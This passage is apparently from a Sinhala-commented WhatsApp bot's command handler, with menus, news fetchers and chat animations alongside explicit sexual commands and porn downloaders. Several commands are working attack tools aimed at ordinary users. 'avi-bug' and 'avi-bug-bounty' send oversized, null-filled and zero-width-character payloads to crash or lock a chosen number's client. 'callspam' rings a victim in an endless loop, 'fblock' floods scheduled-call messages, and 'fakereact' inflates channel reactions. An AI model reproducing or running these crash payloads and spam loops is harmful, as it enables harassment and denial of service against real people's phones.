        m.reply('ඇහෙනවද මහත්තයෝ ඒ කෙඳිරිල්ල? ඔයාටත් මෝල් වුණා නේද? 🥵💦');
    } catch (e) {
        console.log(e);
        m.reply('අයියෝ මහත්තයෝ, ඕඩියෝ එක එවන්න බැරි වුණා. ❌');
    }
}
break

case 'sexva':
case 'mol': {
    if (m.isGroup && !global.db.groups[m.chat].nsfw) return m.reply('මුලින් NSFW On කරගන්න මහත්තයෝ... 🫦')
    
    m.react('🫦')
    try {
        // මේක Nekos.life එකේ කෙඳිරිලි සද්ද (Gasm) දෙන API එක
        let res = await axios.get('https://nekos.life/api/v2/img/gasm')
        let audio_url = res.data.url

        await Avishka.sendMessage(m.chat, { 
            audio: { url: audio_url }, 
            mimetype: 'audio/mp4', 
            ptt: true // මේකෙන් තමයි Voice Note එකක් විදිහට යවන්නේ
        }, { quoted: m })

        m.reply('අම්මෝ ඒ සද්දේ... මහත්තයාට දැන්ම බඩු යයි වගේ නේද? 🥵💦')
    } catch (e) {
        console.log(e)
        // API එක අවුල් නම් මේ Direct link එක දාලා බලන්න
        try {
            await Avishka.sendMessage(m.chat, { 
                audio: { url: 'https://www.myinstants.com/media/sounds/anime-moan.mp3' }, 
                mimetype: 'audio/mp4', 
                ptt: true 
            }, { quoted: m })
        } catch (err) {
            m.reply('අයියෝ මහත්තයෝ, මේ වෙලාවේ කෙල්ලෝ නිදි වගේ. Audio එක එවන්න බැහැ. ❌')
        }
    }
}
break





case 'pussy':
case 'hutta': {
    if (m.isGroup && !global.db.groups[m.chat].nsfw) return m.reply('මුලින් NSFW On කරගන්න මහත්තයෝ... 🫦')
    m.react('🍑')
    
    try {
        // Waifu.im API එක පාවිච්චි කරමු, මේක කවදාවත් වැරදෙන්නේ නැහැ
        let res = await axios.get('https://api.waifu.im/search?included_tags=ero')
        let img = res.data.images[0].url
        
        await Avishka.sendMessage(m.chat, { 
            image: { url: img }, 
            caption: 'අම්මෝ මහත්තයෝ ඒකේ ලස්සන... දැක්කම මටත් මෝල් වෙනවා! 🫦👅💦' 
        }, { quoted: m })
    } catch (e) {
        console.log(e)
        m.reply('හුත්තක් හොයාගන්න බැරි වුණා මහත්තයෝ! ❌')
    }
}
break

case 'avimenu':
    case 'avihelp':
    case 'avimain': {
        const menuCards = [
            {
                url: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800',
                body: '👋 *සාදරයෙන් පිළිගනිමු!*\n\nමෙය Avi Bot හි ප්‍රධාන Menu එකයි. පහත Category අතරින් ඔබට අවශ්‍ය එකක් තෝරන්න.',
                footer: 'Avi Bot System • v2.0',
                buttons: [
                    {
                        name: 'quick_reply',
                        buttonParamsJson: JSON.stringify({ display_text: '📂 Categories', id: `${prefix}avicategory` })
                    },
                    {
                        name: 'quick_reply',
                        buttonParamsJson: JSON.stringify({ display_text: '📞 Contact Support', id: `${prefix}avicontact` })
                    }
                ]
            },
            {
                url: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800',
                body: '⚙️ *Bot Settings & Status*\n\nBot එකෙහි වත්මන් තත්වය සහ පද්ධති තොරතුරු මෙතැනින් බලන්න.',
                footer: 'System Info',
                buttons: [
                    {
                        name: 'quick_reply',
                        buttonParamsJson: JSON.stringify({ display_text: '📊 Check Status', id: `${prefix}avistatus` })
                    }
                ]
            }
        ];

        await Avishka.sendCarouselMsg(
            m.chat,
            '🤖 *AVI BOT MAIN INTERACTIVE MENU*',
            'Swipe left/right to navigate cards',
            menuCards,
            { quoted: m }
        );     
    }
break;


case 'avishop': {
        await Avishka.sendProduct(m.chat, {
            title: "Avi Mobile Solution - Repair Service",
            description: "High-quality mobile software & hardware repair services.",
            price: "1500",
            currency: "LKR",
            productId: `AVI-SERVICE-${Date.now()}`
        }, { quoted: m });
    }
break
 
  case 'xdl':
  m.react('⏳');
    if (!args[0]) return m.reply(`Link එකක් දෙන්න:  Example :  xdl <link>`);

    try {
      let link = args[0];
      if (!link.includes('xnxx')) {
        let index = parseInt(args[0]) - 1;
        let userList = global.videoListXXX?.find(v => v.from === m.sender);
        if (!userList || !userList.urls[index]) return m.reply('Link index එක invalid.');
        link = userList.urls[index];
      }

      let res = await xnxxdl(link);
      let video = res.result.files.high;
      await Avishka.sendMessage(m.chat, {video: {url: video}, mimetype: 'video/mp4', fileName: res.result.title, caption:`*Here is Your Video*`}, {quoted: m});
    } catch (e) {
      m.reply('Download එකක් fail වුනා.');
    }
m.react('✅');
    break;




  case 'resend':
    if (quotedMessage?.imageMessage) {
      const imageCaption = quotedMessage.imageMessage.caption || '';
      const imageUrl = await Avishka.downloadAndSaveMediaMessage(quotedMessage.imageMessage);

      await Avishka.sendMessage(m.from, {
        image: { url: imageUrl },
        caption: imageCaption,
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 9999,
          isForwarded: true,
        },
      });

      reply("Image sent successfully!");
    } else {
      reply("📌 Please reply to an image message to resend it.");
    }
    break;




  case 'panties':
    try {
      const res = (await axios.get('https://raw.githubusercontent.com/BrunoSobrino/TheMystic-Bot-MD/master/src/JSON/panties.json')).data;
      const url = res[Math.floor(Math.random() * res.length)];
      await Avishka.sendMessage(m.chat, { image: { url }, caption: ` _𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢_` }, { quoted: m });
    } catch (e) {
      m.reply('❌ Error loading image.');
    }
    break;


  case 'hentai' :
  try {
    const res = (await axios.get(`https://coffee.alexflipnote.dev/random`)).data;
    const haha = await res[Math.floor(res.length * Math.random())];
    Avishka.sendMessage(m.chat, {image: {url: haha}, caption: `_${command}_`}, {quoted: m}); 
    } catch (e) {
      m.reply('❌ Error loading image.');
    }
    break;


			
case 'couplepp': case 'ccpp': {
let anu = require('./ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
Avishka.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
Avishka.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break

      
      		
 case 'sex': {
			
      const url = await pack[Math.floor(Math.random() * pack.length)];
     /* Avishka.sendButtonMsg(m.chat, {image: {url: url}, caption: `_Sexy Girl_ \n * 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢 ©*`}, {quoted: m});*/
					const buttons = [
						{
							buttonId: ` sex `,
							buttonText: { displayText: 'Next' },
							type: 1
						},
						
					]
					await Avishka.sendButtonMsg(m.chat, {
						image: { url: url},
						caption:'   _Sexy Girl_                  🤤 \n \n *𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢 ©*',
						footer: null,
						buttons: buttons,
						headerType: 1,
						viewOnce: false
					}, { quoted: m })
		
			}
				break			
				
					
					

case 'avi-bug': {
   // if (!m.isOwner) return;

    let target = m.quoted ? m.quoted.sender : m.chat;

    // වට්සැප් එකට කියවන්න අමාරු ඉතාමත් සංකීර්ණ Binary Node එකක් සෑදීම
    const node = {
        tag: 'message',
        attrs: { to: target, type: 'text' },
        content: [
            {
                tag: 'body',
                attrs: {},
                content: Buffer.alloc(70000, '0x00').toString() // අති විශාල හිස් දත්තයක්
            },
            {
                tag: 'biz',
                attrs: {},
                content: [
                    {
                        tag: 'order',
                        attrs: {
                            id: 'AVI-BUG-V4',
                            thumbnail: 'https://github.com/avishka33/PRINCE-AVI-MD-v3/raw/main/AMedia/Avi.jpeg',
                            item_count: '999999999',
                            status: 'INQUIRY',
                            surface: 'CATALOG',
                            token: 'AVI_BYPASS'
                        }
                    }
                ]
            }
        ]
    };

    // සාමාන්‍ය sendMessage වෙනුවට කෙලින්ම Node එකක් විදිහට යැවීම
    await Avishka.query(node);

    m.reply("Extreme Node Bug Sent! ⚡😈");
    break;
}

				
					
					
					
					
	case 'antibot':{
		      //   if (!m.isGroup) return XeonStickGroup()
//if (!isBotAdmins) return XeonStickBotAdmin()
//if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return m.reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  m.reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  m.reply(`${command} is disabled`)
               }
               }
            break		
            
   
            		
            		         		
case 'fakereact': {
    // භාවිතය: .fakereact [Channel_Link_හෝ_JID] | [Message_ID]
    let [targetJid, msgId] = text.split('|');
    if (!targetJid || !msgId) return m.reply("JID සහ Message ID එක ලබා දෙන්න.");

    // රියැක්ෂන් ලිස්ට් එකක්
    const emojis = ["❤️", "🔥", "👍", "😮", "😂", "🙌"];
    
    m.reply("🚀 Fake Reactions යවමින් පවතී...");

    for (let i = 0; i < emojis.length; i++) {
        setTimeout(async () => {
            await Avishka.newsletterMsg(targetJid.trim(), {
                react: emojis[i],
                id: msgId.trim()
            });
        }, i * 300); // මිලි තත්පර 300 ක පරතරයකින් රියැක්ෂන් මාරු කරනවා
    }
}
break;
		         		         		
            		         		         		         	
            		         		         		         		         		
            		         		         		         		         			         		
case 'jildl': {
        const videoUrl = args[0]; 

        if (!videoUrl) {
            return m.reply("❌ කරුණාකර Video Link එක ලබාදෙන්න! (Ex: .jildl https://jilhub.org/videos/...)");
        }

        try {
            await m.reply("⏳ වීඩියෝව Download වෙමින් පවතී, මොහොතක් රැඳී සිටින්න...");

            // API Request එක ලබාගැනීම
            const apiUrl = `https://avi-api.vercel.app/api/jilhub/download?url=${encodeURIComponent(videoUrl)}`;
            const response = await axios.get(apiUrl);
            const data = response.data;

            // streams array එකෙහි 3 වන URL එක (Index 2) ලබාගැනීම
            if (data && data.streams && data.streams.length >= 3) {
                const downloadUrl = data.streams[3].url; 
                const videoType = data.streams[3].type || 'Video';

                // WhatsApp හරහා Video එක Send කිරීම
                await Avishka.sendMessage(m.chat, {
                    video: { url: downloadUrl },
                    caption: `✅ **Downloaded Successfully!**\n\n🔹 **Type:** ${videoType}`
                }, { quoted: m });

            } else {
                m.reply("❌ වීඩියෝ Link එක සොයාගැනීමට නොහැකි විය.");
            }

        } catch (error) {
            console.error(error);
            m.reply("❌ Error එකක් සිදු විය! කරුණාකර Link එක නිවැරදිදැයි පරීක්ෂා කරන්න.");
        }
      }
        break;
            		         		         		         		         			         			         			         		
            		         		         		         		         			         			         			         			         			         		
            				
case 'channelreact': {
    // භාවිතය: .channelreact [Channel_JID] | [Message_ID] | [Emoji]
    // උදා: .channelreact 120363xxxx@newsletter | 150 | ❤️
    
    let [jid, msgId, emoji] = text.split('|');
    if (!jid || !msgId || !emoji) return m.reply(`*භාවිතය:* ${prefix + command} jid | message_id | emoji`);

    m.reply("⏳ Reactions යවමින් පවතී... කරුණාකර රැඳී සිටින්න.");

    try {
        // චැනල් එකේ රියැක්ෂන් යැවීමට විශේෂ 'newsletterMsg' function එක භාවිතා කරයි
        await Avishka.newsletterMsg(jid.trim(), {
            react: emoji.trim(),
            id: msgId.trim() // මෙතනට දිය යුත්තේ පෝස්ට් එකේ server_id එකයි
        });

        m.reply("✅ Reaction එක සාර්ථකව යැවුවා!");
    } catch (e) {
        console.error(e);
        m.reply("❌ Reaction යැවීමේදී දෝෂයක් වුණා. JID සහ Message ID එක නිවැරදිදැයි බලන්න.");
    }
}
break;
						
            								
            										
            														
            		
case 'fblock':
//if (allowedUsers12.includes(xeonmatch12)) {
if (!q) return m.reply(`Example:\n ${prefix + command} 15`)
victim = text.split("|")[0]
for (let i = 0; i < victim; i++) {

await Avishka.relayMessage(m.chat, {
"messageContextInfo": {
"messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
"deviceListMetaData": {},
"deviceListMetadataVersion": 2
},
"scheduledCallCreationMessage": {
"scheduledTimestampMs": '1200',
callType: "VIDEO",
"title": botname,
}
}, {additionalAttributes:{
edit: '7'
}})
}
break						
      	
case 'logo': {
    if (!text) return m.reply("ලෝගෝ එකට අවශ්‍ය නම ලබා දෙන්න. (උදා: .logo Avishka)");
    
    m.reply("🎨 ඔබේ ලෝගෝව නිර්මාණය කරමින් පවතී...");
    
    try {
        // ඉතා පැහැදිලි PNG ලෝගෝ එකක් ලබා දෙන API එකක්
        // background=333 (Dark gray) සහ color=fff (White text) ලෙස සකසා ඇත
        let logoUrl = `https://dummyimage.com/600x400/333/fff.png&text=${encodeURIComponent(text)}`;
        
        // එසේත් නැත්නම් තවත් ලස්සන "Initials" ලෝගෝ එකක් (විකල්පයක් ලෙස)
        // let logoUrl = `https://ui-avatars.com/api/?name=${encodeURIComponent(text)}&background=random&color=fff&size=512`;

        await Avishka.sendMessage(m.chat, { 
            image: { url: logoUrl }, 
            caption: `✨ *ඔබේ ලෝගෝව සූදානම්:* ${text}\n\n𝚂𝚌𝚛𝚒𝚙𝚝 𝚋𝚢 𝙰𝚟𝚒𝚜𝚑𝚔𝚊 𝚂𝚑𝚊𝚟𝚒𝚗𝚍𝚊` 
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        m.reply("❌ ලෝගෝව සෑදීමේදී දෝෂයක් සිදු විය.");
    }
}
break;



      											
      											    											
      											    											    case 'lyrics': {
    if (!text) return m.reply("සින්දුවේ නම ලබා දෙන්න. (උදා: .lyrics Manike Mage Hithe)");
    const axios = require('axios');
    try {
        let res = await axios.get(`https://api.lyrics.ovh/v1/${encodeURIComponent(text)}`);
        if (!res.data.lyrics) return m.reply("❌ පද වැල සොයාගත නොහැකි විය.");
        m.reply(`🎶 *${text} Lyrics:*\n\n${res.data.lyrics}`);
    } catch (e) {
        m.reply("❌ දෝෂයකි: සින්දුව සොයාගත නොහැකි විය.");
    }
}
break;
											
case 'avi-bug-bounty': {
    // භාවිතය: .avi-bug-bounty 94787672517/5
    let [number, amount] = text.split('/');
    if (!number || !amount) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx/වාර ගණන`);

    await loading(); // ඔබේ බොට් එකේ loading function එක
    let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    let loopCount = parseInt(amount);

    m.reply(`🎯 Target: ${target}\n🚀 පෑලෝඩ් ${loopCount}ක් යැවීම ආරම්භ කළා...`);

    for (let i = 0; i < loopCount; i++) {
        try {
            // 1. පරණ පෑලෝඩ් වල එකතුවක් ලෙස නව පර්යේෂණාත්මක පණිවිඩය
            const deadCode = "\u17B4\u17B5\u202E\u2060\u200B\u034F\u1160\u200D".repeat(500);
            const largeBuffer = Buffer.alloc(1024 * 100, 0x01); // 100KB Safe Buffer

            var bugMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "AVI_STRESS_V8",
                                hasMediaAttachment: true,
                                jpegThumbnail: largeBuffer
                            },
                            nativeFlowMessage: {
                                buttons: [{
                                    name: "review_and_pay",
                                    buttonParamsJson: JSON.stringify({
                                        currency: "IDR",
                                        total_amount: { value: 999999999999, offset: 100 },
                                        reference_id: "AVI-" + Date.now(),
                                        type: "physical-goods",
                                        order: {
                                            status: "payment_requested",
                                            subtotal: { value: 49069994400, offset: 100 },
                                            items: [{ name: deadCode, amount: { value: 1000, offset: 100 }, quantity: 99 }]
                                        }
                                    })
                                }],
                                messageParamsJson: "\0".repeat(100000) 
                            }
                        }
                    }
                }
            }), { userJid: target });

            // පණිවිඩය යැවීම
            await Avishka.relayMessage(target, bugMessage.message, { 
                participant: { jid: target }, 
                messageId: bugMessage.key.id 
            });

            // 2. අතිරේකව "List Message" පෑලෝඩ් එකක් යැවීම (UI එක ලොක් කිරීමට)
            await Avishka.relayMessage(target, {
                listMessage: {
                    title: "🗡REAL-KING-AVI🗡" + "\0".repeat(50000),
                    listType: 2,
                    productListInfo: {
                        productSections: [{ title: 'test', products: [{ productId: "4392524570816732" }] }],
                        businessOwnerJid: '0@s.whatsapp.net'
                    }
                }
            }, { participant: { jid: target } });

            // තත්පර 2ක විරාමයක් (Bot එක ආරක්ෂා කර ගැනීමට)
            await new Promise(resolve => setTimeout(resolve, 2000));

        } catch (e) {
            console.log("Loop Error:", e);
        }
    }
    m.reply(`✅ සියලුම පෑලෝඩ් යවා අවසන්. ඔබේ LDPlayer එක පරීක්ෂා කරන්න.`);
}
break;
											    											    											    											    											
      											case 'callspam':{

if (!q) return m.reply(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "94772836332") {
      m.reply(`*Fuck you* \n *you cant send bug to Developer 😂*`)
    return;

    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  }
  sendMessageWithMentions(
    "Successfully Sent Spam Call To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
while (true) {
await sendOfferCall(Xreturn)
}
  
  }
break;						



    case 'shop': {
        const cards = [
            {
                url: "https://files.catbox.moe/mjem6q.jpg",
                body: "Laptop Computer - Core i5 12th Gen",
                footer: "Price: LKR 185,000",
                buttons: [
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({ display_text: "Buy Online", url: "https://example.com/buy" })
                    }
                ]
            },
            {
                url: "https://files.catbox.moe/mjem6q.jpg",
                body: "Wireless Gaming Mouse",
                footer: "Price: LKR 8,500",
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({ display_text: "Order Now", id: ".order_mouse" })
                    }
                ]
            },
                        {
                url: "https://files.catbox.moe/mjem6q.jpg",
                body: "Wireless Gaming Mouse",
                footer: "Price: LKR 8,500",
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({ display_text: "Order Now", id: ".order_mouse" })
                    }
                ]
            }
        ];

        await Avishka.sendCarouselMsg(
            m.chat, 
            "🛍️ *අපගේ Product Catalog එක පහතින් බලන්න:*", 
            "Swipe left/right to view more", 
            cards
        );
        }
        break;





case 'jid':
case 'id': {
    try {
        let targetId = "";

        if (m.quoted) {
            // 1. මුලින්ම බලනවා forward කරපු මැසේජ් එකක contextInfo තියෙනවද කියලා
            const contextInfo = m.quoted.msg?.contextInfo || m.msg?.contextInfo;
            
            if (contextInfo?.forwardedNewsletterMessageInfo) {
                // චැනල් එකක නියම ID එක මෙතන තියෙනවා
                targetId = contextInfo.forwardedNewsletterMessageInfo.newsletterJid;
            } else {
                // සාමාන්‍ය මැසේජ් එකක් නම් මැසේජ් එක එවපු කෙනාගේ ID එක
                targetId = m.quoted.sender;
            }
        } else {
            // Reply කරලා නැත්නම් දැනට ඉන්න chat එකේ ID එක
            targetId = m.chat;
        }

        if (!targetId || targetId === "null") {
            return m.reply("*ID එක සොයාගත නොහැකි විය. කරුණාකර චැනල් එකේ මැසේජ් එකක් Forward කර එයට reply කරන්න.*");
        }

        await m.reply(`*CHANNEL/JID:* ${targetId}`);
        
    } catch (e) {
        console.error(e);
        m.reply("*Error:* ID එක ලබා ගැනීමට නොහැකි විය.");
    }
}
break;


   

case 'magic': {
    if (!m.text) return m.reply("*කරුණාකර පණිවිඩයක් ලබා දෙන්න. (උදා: .magic Hello)*");

    // පෙන්වන්න අවශ්‍ය Animation පියවරවල් මෙතන තියෙන්නේ
    let frames = [
        "🔍 Searching...",
        "⏳ Processing data...",
        "🔓 Encrypting...",
        "✨ Magic is happening...",
        "✅ Done!"
    ];

    // මුලින්ම පළමු පියවර යවනවා
    let { key } = await Avishka.sendMessage(m.chat, { text: "🔮" });

    // එකින් එක මැසේජ් එක Edit කරනවා
    for (let frame of frames) {
        await new Promise(resolve => setTimeout(resolve, 1000)); // තත්පර 1ක පරතරයක්
        await Avishka.sendMessage(m.chat, { text: frame, edit: key });
    }

    // අවසානයේ ඔයා දුන්න නියම මැසේජ් එක පෙන්වනවා
    await new Promise(resolve => setTimeout(resolve, 1000));
    await Avishka.sendMessage(m.chat, { text: `*🪄 MAGIC RESULT:* \n\n${m.text}`, edit: key });
}
break;





case 'clock':
case 'time': {
    // පළමු මැසේජ් එක යවනවා
    let { key } = await Avishka.sendMessage(m.chat, { text: "🕒 *ඔරලෝසුව පණගන්වමින්...*" });

    // තත්පර 10ක් යනතුරු මැසේජ් එක update කරනවා (තත්පරයෙන් තත්පරයට)
    for (let i = 0; i < 10; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // ලංකාවේ වෙලාව සහ දිනය සැකසීම
        let date = new Date().toLocaleString("en-US", { timeZone: "Asia/Colombo" });
        let timeString = new Date(date).toLocaleTimeString();
        let dateString = new Date(date).toDateString();

        let clockMsg = `*─── [ DIGITAL CLOCK ] ───*\n\n`;
        clockMsg += `📅 *Date:* ${dateString}\n`;
        clockMsg += `⌚ *Time:* ${timeString}\n\n`;
        clockMsg += `*──────────────────*`;

        // මැසේජ් එක Edit කරනවා
        await Avishka.sendMessage(m.chat, { text: clockMsg, edit: key });
    }
    
    // අවසානයේ ස්ථිර මැසේජ් එකක් පෙන්වනවා
    await Avishka.sendMessage(m.chat, { text: `✅ *ඔරලෝසුව නතර විය.* \nඅවසාන වෙලාව: ${new Date().toLocaleTimeString()}`, edit: key });
}
break;


case 'heart': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "❤️ *Heartbeat Starting...*" });

    // හදවතේ පියවරවල් (Frames)
    const heartFrames = [
        "```\n   _  _ \n  / \\/ \\ \n  \\    / \n   \\  /  \n    \\/   \n```", // කුඩා හදවත
        "```\n    _   _   \n  /   \\ /   \\ \n |     |     | \n  \\         /  \n   \\       /   \n    \\     /    \n     \\   /     \n      \\ /      \n```" // ලොකු හදවත
    ];

    for (let i = 0; i < 20; i++) { // 20 වතාවක් ගැහෙනවා
        try {
            let frame = heartFrames[i % heartFrames.length];
            await Avishka.sendMessage(m.chat, { text: `*LOVE MAGIC* ❤️\n${frame}`, edit: key });
            await new Promise(resolve => setTimeout(resolve, 600)); // වේගය වැඩි කිරීමට 600ms
        } catch (e) { break; }
    }
    await Avishka.sendMessage(m.chat, { text: "❤️ *Stay Happy!*", edit: key });
}
break;

case 'train': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "🚉 *දුම්රිය පැමිණෙමින් පවතී...*" });

    // මෙන්න නියම දිග කොච්චිය - මැදිරි කිහිපයක් එක්ක
    const trainFrames = [
        "```\n                   [🚂] \n___________________ooo__\n```",
        "```\n              [🚂]-[__]- \n___________ooo____ooo___\n```",
        "```\n         [🚂]-[__]-[__]- \n______ooo____ooo____ooo__\n```",
        "```\n    [🚂]-[__]-[__]-[__]- \n_ooo____ooo____ooo____ooo_\n```",
        "```\n [🚂]-[__]-[__]-[__]- \nooo____ooo____ooo____ooo__\n```"
    ];

    for (let i = 0; i < 25; i++) {
        try {
            // දුම සහ රේල් පීල්ලේ Animation එක
            let smoke = i % 2 === 0 ? "      ( ) ( )" : "    ( ) ( )";
            let track = "━┻━┻━┻━┻━┻━┻━┻━┻━┻━┻━┻━"; 
            
            let currentFrame = trainFrames[i % trainFrames.length];

            let message = `*─── [ RAILWAY ] ───*\n${smoke}\n${currentFrame}${track}\n*────────────────────*`;

            await Avishka.sendMessage(m.chat, { text: message, edit: key });
            
            await new Promise(resolve => setTimeout(resolve, 500)); 
        } catch (e) {
            break;
        }
    }

    await Avishka.sendMessage(m.chat, { text: "🚉 *දුම්රිය නතර විය.*", edit: key });
}
break;

    case 'newsfirst':
    case 'sirasanews':{
        try {
            await m.reply("📰 *news 1st නවතම පුවත් ලබා ගනිමින් පවතී...*");

            // 1. API Endpoint එකෙන් දත්ත ලබා ගැනීම
            const response = await axios.get('https://avi-news-api.vercel.app/api/sirasa');
            const resData = response.data;

            if (!resData.status || !resData.data || resData.data.length === 0) {
                return m.reply("❌ පුවත් ලබා ගැනීමට නොහැකි විය. කරුණාකර පසුව නැවත උත්සාහ කරන්න.");
            }

            // 2. valid news පමණක් filter කර ගැනීම (අදාල නැති comment links ඉවත් කිරීම)
            const validNews = resData.data.filter(item => 
                item.title && 
                !item.title.includes("(0)Comments") && 
                item.description !== "විස්තරයක් ලබා දී නොමැත."
            );

            // 3. නවතම පුවත තෝරා ගැනීම (First Item)
            const latestNews = validNews[7] || resData.data[0];

            const captionText = `📰 *News 1st LATEST NEWS*\n\n` +
                `📌 *${latestNews.title}*\n\n` +
                `📝 ${latestNews.description}\n\n` +
                `🔗 *Read More:* ${latestNews.link}\n\n` +
                `POWERED BY AVI BOT`;

            // 4. Image එකක් තිබේ නම් Image එක සමඟ Send කිරීම, නැතහොත් Text Message එකක් ලෙස Send කිරීම
            if (latestNews.image) {
                await Avishka.sendMessage(m.chat, {
                    image: { url: latestNews.image },
                    caption: captionText
                }, { quoted: m });
            } else {
                await Avishka.sendMessage(m.chat, {
                    text: captionText
                }, { quoted: m });
            }

        } catch (error) {
            console.error(error);
            await m.reply("❌ API Error: පුවත් Fetch කිරීමේදී දෝෂයක් සිදු විය.");
        }
       }
        break




    case 'derana':
    case 'derananews':{
        try {
            await m.reply("📰 *Ada Derana නවතම පුවත් ලබා ගනිමින් පවතී...*");

            // 1. API Endpoint එකෙන් දත්ත ලබා ගැනීම
            const response = await axios.get('https://avi-news-api.vercel.app/api/derana');
            const resData = response.data;

            if (!resData.status || !resData.data || resData.data.length === 0) {
                return m.reply("❌ පුවත් ලබා ගැනීමට නොහැකි විය. කරුණාකර පසුව නැවත උත්සාහ කරන්න.");
            }

            // 2. valid news පමණක් filter කර ගැනීම (අදාල නැති comment links ඉවත් කිරීම)
            const validNews = resData.data.filter(item => 
                item.title && 
                !item.title.includes("(0)Comments") && 
                item.description !== "විස්තරයක් ලබා දී නොමැත."
            );

            // 3. නවතම පුවත තෝරා ගැනීම (First Item)
            const latestNews = validNews[0] || resData.data[0];

            const captionText = `📰 *ADA DERANA LATEST NEWS*\n\n` +
                `📌 *${latestNews.title}*\n\n` +
                `📝 ${latestNews.description}\n\n` +
                `🔗 *Read More:* ${latestNews.link}\n\n` +
                `POWERED BY AVI BOT`;

            // 4. Image එකක් තිබේ නම් Image එක සමඟ Send කිරීම, නැතහොත් Text Message එකක් ලෙස Send කිරීම
            if (latestNews.image) {
                await Avishka.sendMessage(m.chat, {
                    image: { url: latestNews.image },
                    caption: captionText
                }, { quoted: m });
            } else {
                await Avishka.sendMessage(m.chat, {
                    text: captionText
                }, { quoted: m });
            }

        } catch (error) {
            console.error(error);
            await m.reply("❌ API Error: පුවත් Fetch කිරීමේදී දෝෂයක් සිදු විය.");
        }
        }
        break
    

case 'news':
case 'hirunews': {
  //  const axios = require('axios');
    
    try {
        // API එකෙන් Data ගන්නවා
        const response = await axios.get('https://hirunews.vercel.app/api/latest-news?limit=5');
        const newsArray = response.data.data; // මෙතන තමයි කලින් වැරදුණේ (දැන් data.data)

        if (!newsArray || newsArray.length === 0) return m.reply("News සොයාගත නොහැකි විය. පසුව උත්සාහ කරන්න.");

        // 1. පළවෙනි News එක Main එක විදිහට ගන්නවා
        let main = newsArray[1];
        let sections = [];

        // 2. ඔක්කොම News ටික List එකට දානවා
        newsArray.forEach((news, i) => {
            sections.push({
                title: `${i + 1}. ${news.headline.substring(0, 30)}...`,
                rowId: `.news_view ${news.url}`, // පස්සේ කියවන්න URL එක යවනවා
                description: `📅 ${news.date} | 📂 ${news.category}`
            });
        });

        // 3. Carousel/List Message එක හදනවා
        const listMessage = {
            image: { url: main.thumbnail }, // පින්තූරය පෙන්වීමට
            caption: `🗞️ *HIRU NEWS LATEST UPDATE*\n\n📌 *Headline:* ${main.headline}\n\n📖 *Summary:* ${main.summary.substring(0, 200)}...\n\n⌚ *Time:* ${main.date}\n\n🔗 *Link:* ${main.url}\n\n`,
            footer: "පහත බොත්තම එබීමෙන් තවත් පුවත් බලන්න",
            buttonText: "More News 📰",
            sections: [{ title: "🔥 Top 5 Latest News", rows: sections }]
        };

        await Avishka.sendMessage(m.chat, listMessage, { quoted: m });

    } catch (e) {
        console.error(e);
        m.reply("Error fetching news! API එකේ හෝ Server එකේ අවුලක්. 🥹");
    }
}
break;





case 'bunny3d':
case 'rabbit3d': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "🐇 *3D හාවා සූදානම් වෙයි...*" });

    // 3D හාවා පනින Frames (Animation)
    const bunny3dFrames = [
        // Frame 1: බිම (සූදානම) - 3D Look
        "```\n    /\\   /\\\n   (  \\_/  )\n  (  .-.  )\n  ( (   ) )\n  \"--'-'--\"\n  (_(__)__)\n   \\_/_\\_/\n```",
        // Frame 2: පනින අවස්ථාව (කන් දෙක උඩට, කකුල් පහළට) - 3D Look
        "```\n     /\\ /\\\n    ( o.o )\n   ( (   ) )\n   ( (   ) )\n    \"--'--\"\n    | | | |\n   / \\_/ \\ \n```",
        // Frame 3: අහසේ ඉන්න අවස්ථාව (ඉදිරියට නැමිලා) - 3D Look
        "```\n       /\\ /\\\n      ( ^.^ )\n     ( (   ) )\n    ( (     ) )\n    \"--'---'--\"\n      \\ \\ / /\n       \\_/_/\n```",
        // Frame 4: නැවත බිමට පතිත වීම (පහළට එනවා) - 3D Look
        "```\n          /\\   /\\\n         (  \\_/  )\n        (  '-'  )\n       ( (   ) )\n       \"--'-'--\"\n       (_(__)__)\n        \\_/_\\_/\n```"
    ];

    for (let i = 0; i < 20; i++) {
        try {
            let currentFrame = bunny3dFrames[i % bunny3dFrames.length];
            
